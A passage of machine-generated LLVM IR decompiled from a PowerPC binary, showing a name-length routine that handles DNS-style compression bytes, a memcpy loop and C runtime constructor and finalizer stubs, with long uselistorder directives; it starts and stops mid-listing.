  %v3_100131e0 = inttoptr i32 %v2_100131e0 to i8*
  %v4_100131e0 = load i8, i8* %v3_100131e0, align 1
  %v5_100131e0 = zext i8 %v4_100131e0 to i32
  %v1_100131e4 = call i32 @__asm_rlwinm(i32 %v5_1001323c21, i32 8, i32 18, i32 23)
  %v0_100131e8 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_100131e8, i32* @r28, align 4
  store i32 0, i32* @r23, align 4
  %v2_100131f0 = or i32 %v5_100131e0, %v1_100131e4
  store i32 %v2_100131f0, i32* @r4, align 4
  br label %dec_label_pc_10013238

dec_label_pc_100131f8:                            ; preds = %dec_label_pc_100131c8
  %v0_100131f8 = load i32, i32* %r11.global-to-local, align 4
  %v2_100131f8 = add i32 %v0_100131f8, %v5_1001323c21
  store i32 %v2_100131f8, i32* @r29, align 4
  %v1_100131fc = add i32 %v2_100131f8, 1
  store i32 %v1_100131fc, i32* @r28, align 4
  %v1_10013200 = load i32, i32* @r24, align 4
  %v2_10013200 = icmp ult i32 %v1_100131fc, %v1_10013200
  br i1 %v2_10013200, label %dec_label_pc_10013208, label %dec_label_pc_10013260

dec_label_pc_10013208:                            ; preds = %dec_label_pc_100131f8
  %v0_10013208 = load i32, i32* @r26, align 4
  %v2_10013208 = add i32 %v0_10013208, %v1_100131cc
  store i32 %v2_10013208, i32* @r4, align 4
  %v0_1001320c = load i32, i32* @r25, align 4
  %v2_1001320c = add i32 %v0_1001320c, %v0_100131f8
  store i32 %v2_1001320c, i32* @r3, align 4
  store i32 %v5_1001323c21, i32* @r5, align 4
  store i32 268513816, i32* @lr, align 4
  %v0_10013214 = call i32 @memcpy()
  %v0_10013218 = load i32, i32* @r30, align 4
  %v2_10013218 = add i32 %v0_10013218, %v5_1001323c21
  store i32 %v2_10013218, i32* @r4, align 4
  %v0_1001321c = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1001321c, label %dec_label_pc_10013224, label %dec_label_pc_10013220

dec_label_pc_10013220:                            ; preds = %dec_label_pc_10013208
  %v0_10013220 = load i32, i32* %r27.global-to-local, align 4
  %v2_10013220 = add i32 %v0_10013220, %v5_1001323c21
  store i32 %v2_10013220, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10013224

dec_label_pc_10013224:                            ; preds = %dec_label_pc_10013208, %dec_label_pc_10013220
  %v0_10013224 = load i32, i32* @r26, align 4
  %v2_10013224 = add i32 %v0_10013224, %v2_10013218
  %v3_10013224 = inttoptr i32 %v2_10013224 to i8*
  %v4_10013224 = load i8, i8* %v3_10013224, align 1
  %v3_10013228 = icmp eq i8 %v4_10013224, 0
  br i1 %v3_10013228, label %dec_label_pc_10013234, label %dec_label_pc_10013230

dec_label_pc_10013230:                            ; preds = %dec_label_pc_10013224
  br label %dec_label_pc_10013234

dec_label_pc_10013234:                            ; preds = %dec_label_pc_10013224, %dec_label_pc_10013230
  %v0_10013234.off0 = phi i8 [ 0, %dec_label_pc_10013224 ], [ 46, %dec_label_pc_10013230 ]
  %v1_10013234 = load i32, i32* @r25, align 4
  %v2_10013234 = load i32, i32* @r29, align 4
  %v4_10013234 = add i32 %v2_10013234, %v1_10013234
  %v5_10013234 = inttoptr i32 %v4_10013234 to i8*
  store i8 %v0_10013234.off0, i8* %v5_10013234, align 1
  %v0_10013238.pre = load i32, i32* @r28, align 4
  %v0_10013240.pre.pre = load i32, i32* @r23, align 4
  %v1_1001323c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10013238

dec_label_pc_10013238:                            ; preds = %dec_label_pc_100131e0, %dec_label_pc_10013234
  %v1_1001323c = phi i32 [ %v2_100131f0, %dec_label_pc_100131e0 ], [ %v1_1001323c.pre, %dec_label_pc_10013234 ]
  %v0_10013240.pre = phi i32 [ 0, %dec_label_pc_100131e0 ], [ %v0_10013240.pre.pre, %dec_label_pc_10013234 ]
  %v0_10013238 = phi i32 [ %v0_100131e8, %dec_label_pc_100131e0 ], [ %v0_10013238.pre, %dec_label_pc_10013234 ]
  %v0_1001323c.pre = load i32, i32* @r26, align 4
  store i32 %v0_10013238, i32* %r11.global-to-local, align 4
  %v2_1001323c = add i32 %v1_1001323c, %v0_1001323c.pre
  %v3_1001323c = inttoptr i32 %v2_1001323c to i8*
  %v4_1001323c = load i8, i8* %v3_1001323c, align 1
  %v5_1001323c = zext i8 %v4_1001323c to i32
  store i32 %v5_1001323c, i32* @r31, align 4
  %v3_10013240 = icmp eq i32 %v0_10013240.pre, 0
  store i1 %v3_10013240, i1* %cr4_eq.global-to-local, align 1
  %v3_10013244 = icmp eq i8 %v4_1001323c, 0
  br i1 %v3_10013244, label %dec_label_pc_1001324c, label %dec_label_pc_100131c0

dec_label_pc_1001324c:                            ; preds = %dec_label_pc_10013238
  %v0_10013254.pre.pre = load i32, i32* %r27.global-to-local, align 4
  br i1 %v3_10013240, label %dec_label_pc_10013260, label %dec_label_pc_10013250

dec_label_pc_10013250:                            ; preds = %dec_label_pc_100131b0, %dec_label_pc_1001324c
  %v0_10013254.pre26 = phi i32 [ %v0_10013254.pre.pre, %dec_label_pc_1001324c ], [ 0, %dec_label_pc_100131b0 ]
  %v1_10013250 = add i32 %v0_10013254.pre26, 1
  store i32 %v1_10013250, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10013260

dec_label_pc_10013260:                            ; preds = %dec_label_pc_100131f8, %dec_label_pc_1001324c, %dec_label_pc_10013250, %entry
  %storemerge1 = phi i32 [ -1, %entry ], [ %v1_10013250, %dec_label_pc_10013250 ], [ %v0_10013254.pre.pre, %dec_label_pc_1001324c ], [ -1, %dec_label_pc_100131f8 ]
  %v1_10013270 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1001318c)
  %v9_10013270 = extractvalue %0 %v1_10013270, 7
  store i4 %v9_10013270, i4* @cr4, align 1
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_10013254.pre.pre, { 1, 0 }
  uselistorder i1 %v3_10013240, { 0, 2, 1 }
  uselistorder i32 %v5_1001323c, { 1, 0 }
  uselistorder i32 %v5_1001323c21, { 5, 4, 0, 3, 2, 1 }
  uselistorder i32 %v0_1001318c, { 1, 0, 2, 3 }
  uselistorder i32* %r27.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder i1* %cr4_eq.global-to-local, { 3, 1, 2, 0 }
  uselistorder i4* @cr4, { 3, 4, 5, 2, 0, 6, 1 }
  uselistorder %0 (i32, i32)* @__asm_mtcrf, { 2, 3, 0, 4, 1 }
  uselistorder i32 ()* @memcpy, { 13, 12, 11, 10, 9, 4, 3, 8, 7, 2, 22, 20, 19, 0, 5, 6, 1, 18, 17, 16, 21, 15, 14 }
  uselistorder i32* @r5, { 43, 44, 45, 3, 46, 47, 48, 12, 59, 60, 52, 53, 39, 4, 54, 1, 55, 13, 14, 15, 16, 17, 18, 61, 19, 20, 21, 22, 23, 24, 74, 9, 10, 8, 5, 56, 57, 66, 67, 68, 40, 25, 26, 27, 75, 76, 77, 78, 69, 70, 2, 71, 72, 73, 28, 30, 29, 31, 0, 32, 33, 34, 11, 62, 63, 49, 50, 35, 36, 37, 51, 7, 64, 65, 6, 38, 41, 42, 58 }
  uselistorder i32* @r29, { 78, 79, 80, 81, 82, 146, 147, 1, 83, 14, 84, 85, 86, 87, 89, 88, 90, 91, 92, 93, 94, 20, 21, 22, 23, 24, 2, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 47, 108, 110, 111, 127, 128, 148, 149, 49, 50, 51, 48, 133, 16, 52, 53, 3, 54, 55, 56, 57, 58, 59, 150, 151, 152, 153, 154, 155, 156, 4, 35, 132, 135, 136, 137, 138, 25, 26, 139, 5, 140, 141, 142, 143, 144, 145, 129, 130, 131, 6, 134, 7, 157, 158, 159, 60, 61, 8, 62, 63, 64, 65, 118, 119, 15, 120, 112, 113, 114, 117, 115, 17, 9, 0, 116, 66, 67, 68, 69, 70, 71, 72, 75, 10, 13, 11, 76, 19, 73, 74, 45, 46, 160, 161, 162, 163, 121, 122, 123, 124, 125, 12, 126, 109, 27, 28, 29, 30, 31, 32, 33, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 77, 18 }
  uselistorder i32* @r28, { 2, 78, 79, 80, 81, 82, 83, 88, 89, 84, 85, 86, 87, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 17, 3, 16, 18, 19, 20, 21, 22, 23, 100, 104, 101, 102, 103, 1, 105, 106, 43, 44, 130, 131, 138, 139, 45, 4, 46, 47, 48, 49, 50, 5, 140, 141, 142, 143, 150, 6, 35, 36, 37, 12, 38, 24, 25, 26, 27, 28, 29, 30, 31, 32, 134, 135, 136, 137, 132, 133, 144, 145, 146, 147, 148, 51, 52, 115, 7, 116, 117, 109, 110, 111, 112, 113, 114, 53, 54, 55, 8, 56, 57, 9, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 0, 74, 75, 13, 14, 15, 41, 42, 149, 118, 119, 120, 121, 10, 122, 11, 123, 124, 125, 126, 127, 128, 129, 76, 77, 107, 108, 33, 34, 39, 40 }
  uselistorder i32 23, { 10, 13, 14, 15, 6, 7, 8, 0, 1, 2, 5, 3, 4, 9, 11, 12 }
  uselistorder i32 18, { 1, 0, 3, 4, 2, 5 }
  uselistorder i32 8, { 83, 84, 85, 86, 87, 88, 18, 19, 89, 90, 91, 92, 93, 94, 24, 25, 20, 13, 14, 15, 26, 27, 28, 29, 30, 95, 96, 97, 98, 17, 43, 118, 0, 100, 44, 45, 46, 47, 48, 49, 50, 51, 10, 52, 53, 54, 130, 131, 138, 141, 8, 76, 77, 11, 31, 12, 80, 115, 32, 122, 121, 119, 120, 33, 34, 35, 123, 124, 125, 126, 127, 128, 1, 108, 109, 110, 21, 135, 136, 137, 2, 142, 3, 139, 140, 101, 102, 36, 103, 37, 55, 56, 57, 58, 59, 22, 60, 61, 62, 63, 4, 5, 64, 65, 9, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 7, 6, 132, 133, 134, 104, 105, 106, 107, 99, 38, 39, 40, 41, 42, 78, 79, 23, 81, 82, 111, 112, 113, 114, 116, 117, 16, 129 }
  uselistorder i32* @r30, { 85, 86, 87, 8, 88, 90, 92, 93, 94, 95, 96, 89, 91, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 19, 20, 21, 1, 22, 23, 24, 7, 25, 26, 111, 108, 109, 5, 110, 4, 43, 44, 45, 9, 46, 47, 48, 113, 114, 115, 124, 125, 126, 127, 17, 128, 129, 130, 131, 132, 133, 134, 135, 49, 50, 51, 52, 53, 146, 147, 10, 54, 55, 56, 57, 58, 11, 156, 157, 158, 159, 12, 149, 160, 171, 161, 162, 27, 0, 82, 13, 83, 84, 150, 151, 152, 28, 29, 30, 31, 32, 153, 154, 155, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 148, 163, 164, 165, 166, 167, 168, 169, 14, 170, 59, 60, 122, 120, 121, 123, 119, 117, 116, 6, 118, 61, 62, 63, 64, 65, 2, 67, 18, 68, 15, 69, 70, 66, 71, 72, 73, 74, 75, 76, 77, 16, 78, 79, 3, 80, 40, 41, 42, 81, 112, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i1 false, { 2, 3, 5, 13, 6, 7, 9, 10, 0, 11, 17, 18, 19, 14, 15, 16, 4, 12, 1, 8, 20 }
  uselistorder i32* @r31, { 142, 2, 7, 143, 6, 144, 145, 146, 8, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 46, 51, 9, 40, 10, 11, 52, 53, 54, 161, 162, 163, 164, 1, 165, 166, 167, 168, 169, 170, 171, 172, 12, 173, 69, 70, 71, 72, 73, 174, 13, 175, 176, 177, 178, 14, 179, 180, 181, 182, 183, 184, 74, 75, 76, 77, 78, 79, 80, 81, 82, 15, 83, 16, 277, 278, 279, 17, 191, 190, 3, 192, 193, 216, 243, 244, 245, 246, 247, 136, 137, 138, 139, 194, 18, 195, 196, 19, 205, 206, 20, 207, 208, 84, 85, 86, 259, 260, 261, 87, 88, 21, 89, 90, 91, 92, 22, 93, 23, 94, 95, 96, 45, 97, 0, 280, 281, 282, 24, 47, 283, 41, 263, 25, 264, 289, 290, 128, 43, 129, 130, 284, 287, 288, 63, 64, 131, 132, 133, 134, 55, 56, 57, 58, 59, 140, 141, 4, 265, 266, 267, 268, 269, 270, 60, 61, 62, 271, 272, 273, 274, 275, 248, 249, 250, 27, 251, 252, 253, 26, 254, 255, 256, 257, 258, 262, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 98, 99, 209, 210, 211, 28, 212, 213, 214, 199, 200, 201, 202, 203, 29, 44, 204, 5, 197, 198, 30, 215, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 33, 32, 117, 31, 121, 122, 34, 123, 124, 125, 126, 49, 50, 119, 118, 120, 66, 35, 67, 285, 36, 286, 48, 37, 42, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 229, 228, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 185, 186, 187, 188, 38, 39, 189, 65, 68, 127, 135, 276 }
  uselistorder i32* @r23, { 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 12, 11, 0, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* @r24, { 3, 4, 7, 5, 6, 8, 9, 10, 0, 11, 12, 13, 14, 15, 2, 16, 17, 18, 1, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* @r6, { 15, 16, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 10, 11, 12, 17, 13, 14, 18 }
  uselistorder i32* @r25, { 11, 12, 13, 15, 16, 14, 17, 1, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 31, 34, 3, 4, 27, 28, 29, 30, 0, 7, 8, 9, 10, 32, 33, 5, 6 }
  uselistorder i32* @r26, { 1, 30, 31, 32, 33, 34, 35, 36, 39, 37, 38, 40, 41, 42, 43, 44, 3, 4, 45, 46, 47, 48, 50, 2, 51, 52, 54, 55, 56, 57, 58, 59, 60, 10, 11, 77, 5, 6, 7, 73, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 74, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 0, 75, 76, 53, 28, 29, 49, 8, 9 }
  uselistorder i32 ()* @__asm_mfcr, { 28, 35, 27, 26, 12, 34, 20, 30, 9, 8, 7, 6, 5, 15, 31, 41, 25, 40, 33, 32, 10, 29, 11, 39, 23, 21, 38, 19, 3, 14, 18, 13, 37, 24, 17, 16, 36, 4, 2, 1, 0, 22 }
  uselistorder label %dec_label_pc_10013260, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10013250, { 1, 0 }
  uselistorder label %dec_label_pc_10013238, { 1, 0 }
  uselistorder label %dec_label_pc_10013234, { 1, 0 }
  uselistorder label %dec_label_pc_10013224, { 1, 0 }
  uselistorder label %dec_label_pc_100131e0, { 1, 0 }
  uselistorder label %dec_label_pc_100131c8, { 1, 0 }
  uselistorder label %dec_label_pc_100131c0, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v0_1001327c = load i32, i32* @r3, align 4
  store i32 %v0_1001327c, i32* %r11.global-to-local, align 4
  %v3_1001327c = icmp eq i32 %v0_1001327c, 0
  %v0_10013284 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1001327c, i32 %v0_10013284)
  %v0_10013294 = load i32, i32* @r4, align 4
  br label %dec_label_pc_100132a0

dec_label_pc_1001328c:                            ; preds = %dec_label_pc_1001329c
  %v1_1001328c = add i32 %v1_100132a0, 2
  br label %dec_label_pc_100132bc

dec_label_pc_1001329c:                            ; preds = %dec_label_pc_100132a0
  %v2_100132b4 = add i32 %v1_100132a4, %v5_100132a0
  %v3_100132b0 = icmp eq i32 %v1_100132ac, 192
  br i1 %v3_100132b0, label %dec_label_pc_1001328c, label %dec_label_pc_100132a0

dec_label_pc_100132a0:                            ; preds = %dec_label_pc_1001329c, %entry
  %v1_100132a0 = phi i32 [ %v2_100132b4, %dec_label_pc_1001329c ], [ %v0_10013294, %entry ]
  %v0_100132a0 = load i32, i32* %r11.global-to-local, align 4
  %v2_100132a0 = add i32 %v0_100132a0, %v1_100132a0
  %v3_100132a0 = inttoptr i32 %v2_100132a0 to i8*
  %v4_100132a0 = load i8, i8* %v3_100132a0, align 1
  %v5_100132a0 = zext i8 %v4_100132a0 to i32
  %v1_100132a4 = add i32 %v1_100132a0, 1
  %v3_100132a8 = icmp eq i8 %v4_100132a0, 0
  %v1_100132ac = call i32 @__asm_rlwinm(i32 %v5_100132a0, i32 0, i32 24, i32 25)
  br i1 %v3_100132a8, label %dec_label_pc_100132bc, label %dec_label_pc_1001329c

dec_label_pc_100132bc:                            ; preds = %dec_label_pc_100132a0, %dec_label_pc_1001328c
  %v1_100132bc = phi i32 [ %v1_1001328c, %dec_label_pc_1001328c ], [ %v1_100132a4, %dec_label_pc_100132a0 ]
  %v0_100132bc = load i32, i32* @r4, align 4
  %v2_100132bc = sub i32 %v1_100132bc, %v0_100132bc
  ret i32 %v2_100132bc

; uselistorder directives
  uselistorder i32 %v1_100132a4, { 1, 0 }
  uselistorder i32 %v5_100132a0, { 1, 0 }
  uselistorder i32 %v1_100132a0, { 2, 1, 0 }
  uselistorder i32 %v0_1001327c, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm, { 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 39, 5, 6, 7, 22, 53, 54, 1, 47, 2, 48, 0, 52, 23, 55, 56, 57, 8, 37, 38, 3, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 4, 40, 41, 42, 43, 36, 51, 44, 45, 46, 49, 50, 58 }
  uselistorder i32 25, { 2, 3, 4, 5, 6, 1, 0, 7 }
  uselistorder i32 24, { 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 14, 38, 39, 47, 40, 41, 44, 15, 5, 49, 6, 16, 45, 42, 43, 17, 18, 19, 20, 21, 22, 23, 24, 25, 13, 52, 53, 46, 7, 8, 9, 10, 11, 12, 1, 2, 3, 4, 26, 27, 48, 50, 0, 51 }
  uselistorder i8 0, { 37, 35, 4, 38, 2, 39, 40, 24, 44, 42, 23, 43, 41, 22, 45, 46, 47, 48, 5, 50, 49, 25, 6, 51, 52, 7, 53, 54, 21, 27, 57, 55, 56, 26, 58, 59, 8, 61, 60, 28, 62, 63, 0, 64, 65, 66, 9, 67, 10, 68, 11, 1, 12, 69, 70, 71, 73, 74, 75, 76, 72, 77, 13, 78, 79, 80, 81, 83, 84, 85, 86, 82, 87, 3, 14, 15, 16, 17, 18, 19, 88, 89, 90, 92, 91, 20, 93, 94, 95, 96, 97, 98, 100, 29, 101, 102, 99, 103, 104, 105, 106, 108, 107, 109, 110, 111, 112, 113, 114, 115, 116, 118, 117, 120, 119, 121, 30, 123, 122, 36, 124, 31, 125, 127, 128, 126, 32, 129, 130, 34, 131, 33, 132, 133, 134, 135, 136, 137, 138 }
  uselistorder i32 192, { 2, 3, 1, 0 }
  uselistorder i32 2, { 0, 4, 120, 49, 121, 122, 30, 1, 2, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 5, 135, 6, 97, 98, 99, 31, 29, 136, 137, 138, 139, 140, 50, 51, 52, 101, 102, 157, 42, 7, 8, 3, 53, 146, 9, 10, 32, 143, 144, 40, 103, 104, 11, 105, 106, 107, 54, 55, 117, 56, 118, 57, 119, 158, 33, 12, 13, 58, 59, 60, 61, 62, 14, 47, 48, 63, 64, 147, 46, 160, 15, 16, 17, 18, 34, 35, 36, 37, 38, 65, 155, 156, 39, 141, 142, 108, 109, 110, 19, 20, 21, 22, 23, 111, 112, 24, 114, 115, 116, 28, 113, 145, 66, 25, 26, 159, 161, 67, 100, 69, 70, 68, 71, 72, 73, 75, 76, 74, 43, 77, 78, 44, 80, 81, 79, 82, 84, 83, 85, 86, 87, 88, 89, 148, 149, 150, 151, 152, 90, 41, 153, 91, 92, 93, 94, 95, 154, 45, 27, 96 }
  uselistorder i32* @r4, { 106, 107, 1, 108, 109, 110, 111, 2, 112, 113, 114, 115, 9, 10, 116, 117, 118, 119, 120, 121, 122, 123, 124, 147, 144, 145, 125, 126, 127, 128, 129, 6, 130, 131, 132, 141, 142, 94, 11, 62, 63, 64, 65, 66, 67, 68, 69, 157, 8, 7, 86, 87, 149, 25, 26, 14, 104, 105, 15, 16, 146, 88, 12, 133, 134, 140, 143, 150, 151, 152, 3, 70, 71, 72, 13, 73, 74, 135, 136, 137, 138, 139, 4, 89, 90, 156, 75, 76, 77, 78, 0, 79, 80, 81, 60, 61, 148, 82, 83, 84, 5, 17, 18, 153, 154, 155, 19, 20, 21, 22, 23, 24, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 85, 91, 92, 93, 95, 96, 97, 98, 99, 100, 101, 102, 103 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 10, 11, 12, 13, 14, 15, 16, 17, 8, 29, 31, 26, 9, 1, 2, 3, 4, 5, 30, 20, 21, 22, 23, 24, 6, 18, 19, 25, 33, 32, 7, 27, 0, 28 }
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1002e000.903 to i32), i32* %r31.global-to-local, align 4
  %v3_100132e0 = load i32, i32* @global_var_1002e000.903, align 4
  %v3_100132e4 = icmp eq i32 %v3_100132e0, -1
  br i1 %v3_100132e4, label %dec_label_pc_10013300, label %dec_label_pc_100132ec

dec_label_pc_100132ec:                            ; preds = %entry, %dec_label_pc_100132ec
  %v0_100132ec = phi i32 [ %v3_100132f4, %dec_label_pc_100132ec ], [ %v3_100132e0, %entry ]
  call void @__pseudo_call(i32 %v0_100132ec)
  %v0_100132f4 = load i32, i32* %r31.global-to-local, align 4
  %v1_100132f4 = add i32 %v0_100132f4, -4
  %v2_100132f4 = inttoptr i32 %v1_100132f4 to i32*
  %v3_100132f4 = load i32, i32* %v2_100132f4, align 4
  store i32 %v1_100132f4, i32* %r31.global-to-local, align 4
  %v3_100132f8 = icmp eq i32 %v3_100132f4, -1
  br i1 %v3_100132f8, label %dec_label_pc_10013300, label %dec_label_pc_100132ec

dec_label_pc_10013300:                            ; preds = %dec_label_pc_100132ec, %entry
  %v0_10013310 = load i32, i32* @r3, align 4
  ret i32 %v0_10013310

; uselistorder directives
  uselistorder i32 %v3_100132f4, { 1, 0 }
  uselistorder i32 -4, { 29, 12, 13, 14, 21, 22, 23, 24, 25, 15, 16, 2, 3, 4, 5, 6, 7, 8, 9, 10, 27, 26, 33, 34, 30, 31, 32, 17, 18, 19, 20, 0, 11, 1, 28 }
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 3, 4, 0 }
  uselistorder i32 -1, { 364, 365, 16, 47, 60, 301, 302, 247, 130, 303, 61, 304, 51, 62, 305, 63, 306, 227, 228, 113, 114, 65, 64, 229, 48, 49, 230, 231, 232, 189, 71, 69, 67, 233, 234, 235, 70, 68, 66, 236, 237, 190, 238, 191, 307, 25, 26, 192, 308, 193, 52, 309, 72, 248, 131, 3, 4, 249, 250, 53, 251, 252, 73, 74, 194, 366, 29, 30, 31, 367, 195, 371, 27, 28, 311, 32, 321, 322, 323, 134, 324, 325, 326, 327, 328, 329, 330, 132, 331, 133, 332, 333, 334, 335, 196, 253, 197, 54, 5, 198, 254, 255, 199, 200, 201, 256, 202, 336, 337, 33, 34, 35, 203, 338, 339, 204, 312, 316, 317, 50, 257, 258, 259, 123, 55, 260, 261, 262, 263, 135, 264, 6, 75, 265, 266, 267, 268, 269, 205, 270, 136, 348, 349, 137, 7, 8, 138, 56, 271, 206, 207, 272, 273, 274, 275, 76, 77, 354, 139, 78, 79, 80, 81, 82, 83, 84, 0, 374, 372, 85, 288, 289, 140, 208, 290, 38, 39, 209, 291, 36, 37, 210, 245, 9, 141, 86, 87, 292, 142, 239, 10, 88, 57, 299, 40, 41, 211, 143, 115, 300, 89, 240, 355, 356, 46, 241, 370, 293, 90, 294, 212, 295, 42, 43, 296, 297, 353, 58, 213, 340, 116, 341, 342, 144, 346, 91, 350, 375, 376, 276, 351, 92, 214, 215, 343, 344, 216, 345, 120, 59, 217, 218, 219, 220, 221, 44, 222, 145, 93, 318, 117, 313, 315, 314, 17, 18, 19, 20, 21, 22, 23, 118, 119, 277, 15, 278, 11, 279, 280, 223, 146, 24, 224, 281, 282, 1, 284, 285, 2, 147, 148, 225, 45, 149, 124, 286, 150, 283, 246, 319, 12, 13, 287, 151, 320, 152, 310, 153, 94, 95, 96, 368, 369, 97, 98, 99, 100, 101, 102, 103, 104, 105, 242, 106, 107, 108, 109, 110, 111, 373, 112, 377, 154, 187, 243, 244, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 298, 168, 169, 170, 171, 172, 14, 173, 174, 347, 188, 226, 175, 176, 121, 177, 178, 352, 179, 122, 180, 125, 126, 127, 128, 129, 181, 182, 357, 358, 359, 183, 360, 361, 362, 363, 184, 185, 186 }
  uselistorder i32 1, {}
  uselistorder label %dec_label_pc_100132ec, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v0_1001332c = load i32, i32* @r3, align 4
  ret i32 %v0_1001332c

; uselistorder directives
  uselistorder i32* @r3, { 19, 20, 180, 181, 184, 182, 183, 0, 185, 10, 186, 54, 55, 56, 187, 188, 189, 44, 190, 21, 11, 151, 152, 12, 22, 98, 99, 100, 278, 290, 287, 288, 191, 199, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 13, 237, 238, 239, 240, 241, 242, 243, 244, 245, 153, 154, 14, 155, 156, 157, 23, 101, 102, 103, 104, 105, 15, 246, 42, 24, 106, 107, 108, 109, 110, 111, 112, 2, 1, 113, 114, 115, 25, 291, 51, 303, 26, 43, 27, 3, 41, 148, 149, 50, 297, 298, 299, 46, 170, 171, 172, 173, 174, 175, 176, 177, 57, 58, 59, 60, 61, 260, 261, 62, 45, 63, 18, 28, 279, 280, 289, 150, 247, 248, 249, 250, 251, 252, 253, 254, 29, 30, 37, 38, 300, 301, 4, 116, 117, 118, 119, 285, 267, 268, 16, 31, 302, 120, 32, 205, 206, 207, 208, 209, 210, 211, 33, 200, 201, 202, 203, 204, 64, 65, 212, 213, 66, 67, 121, 34, 122, 123, 124, 5, 9, 6, 125, 7, 126, 8, 127, 128, 129, 130, 131, 132, 35, 133, 134, 135, 136, 137, 138, 53, 93, 94, 95, 96, 292, 293, 294, 295, 296, 214, 215, 216, 217, 218, 219, 220, 221, 139, 140, 141, 192, 193, 194, 195, 196, 197, 198, 68, 69, 36, 70, 71, 72, 73, 74, 76, 75, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 97, 142, 143, 144, 145, 146, 147, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 52, 178, 179, 255, 256, 257, 258, 259, 262, 17, 263, 264, 265, 266, 269, 270, 271, 273, 272, 274, 275, 276, 47, 277, 48, 281, 282, 283, 284, 286, 39, 40, 49 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  store i32 268514112, i32* @lr, align 4
  %v0_1001333c = call i32 @__do_global_dtors_aux()
  ret i32 %v0_1001333c

; uselistorder directives
  uselistorder i32 0, { 1812, 1813, 37, 1816, 122, 1814, 1815, 61, 1817, 1818, 1819, 1822, 1820, 0, 1821, 1823, 25, 1578, 1579, 1839, 1826, 1829, 1830, 1831, 329, 1832, 1833, 1835, 1834, 1836, 1837, 1838, 1840, 1841, 1842, 1824, 1825, 1827, 1828, 123, 1843, 1845, 1846, 1844, 1847, 1848, 1849, 1850, 242, 1419, 1851, 243, 1420, 1421, 124, 125, 1430, 1431, 98, 1432, 1433, 1434, 1435, 1436, 1437, 1438, 126, 184, 1440, 1439, 127, 1441, 1442, 129, 128, 1443, 330, 1444, 1445, 1446, 131, 130, 1447, 1448, 252, 331, 1449, 132, 1852, 1853, 1854, 1855, 1860, 1856, 65, 1861, 1862, 1857, 1858, 1859, 62, 63, 64, 1863, 332, 38, 39, 40, 230, 1865, 133, 1864, 333, 1866, 1867, 1868, 1869, 134, 1870, 99, 41, 1871, 185, 1872, 1873, 1874, 1782, 186, 1580, 1581, 1875, 1876, 1877, 1878, 1879, 1880, 1881, 1582, 26, 1583, 136, 135, 1584, 1585, 1586, 1587, 137, 1882, 1883, 1884, 1885, 1588, 1589, 1590, 1591, 1592, 1593, 1594, 1595, 27, 1886, 2107, 334, 2110, 68, 335, 253, 2111, 336, 2114, 2115, 66, 67, 2116, 2108, 2109, 337, 338, 1900, 1893, 339, 69, 1894, 1895, 1896, 42, 1898, 1899, 1923, 1924, 1944, 1945, 1946, 1947, 254, 240, 241, 341, 1948, 1949, 1950, 1952, 187, 1955, 342, 255, 1957, 1958, 1959, 1960, 340, 256, 1954, 1951, 1953, 1956, 1961, 244, 1962, 1963, 1964, 1, 2035, 2036, 2037, 139, 138, 2038, 2, 140, 257, 1783, 1784, 1785, 3, 1596, 1597, 189, 1599, 1598, 58, 4, 1600, 188, 5, 1601, 191, 1602, 59, 6, 1603, 190, 1965, 1966, 70, 